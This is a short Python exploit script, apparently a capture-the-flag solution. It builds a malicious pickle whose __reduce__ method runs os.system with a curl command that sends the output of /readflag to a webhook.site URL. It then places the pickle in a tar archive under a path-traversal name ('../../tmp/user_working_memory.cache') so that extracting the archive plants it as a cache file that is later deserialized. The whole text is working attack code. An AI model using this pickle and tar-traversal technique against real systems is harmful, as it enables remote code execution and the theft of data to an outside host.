import pickle
import os
import tarfile, requests
from io import BytesIO

class rce:
    def __reduce__(self):
        cmd = "curl https://webhook.site/da2e4dcd-22b3-432d-a7e9-d4eb7a261f0e --data-urlencode \"q=$(/readflag ramadan_ctf)\""
        return os.system, (cmd,)


pckl = pickle.dumps(rce())
    
with tarfile.open("./exploit.tar", "w") as tar:
    tarinfo = tarfile.TarInfo("../../tmp/user_working_memory.cache")
    tarinfo.size = len(pckl)
    tar.addfile(tarinfo, BytesIO(pckl))



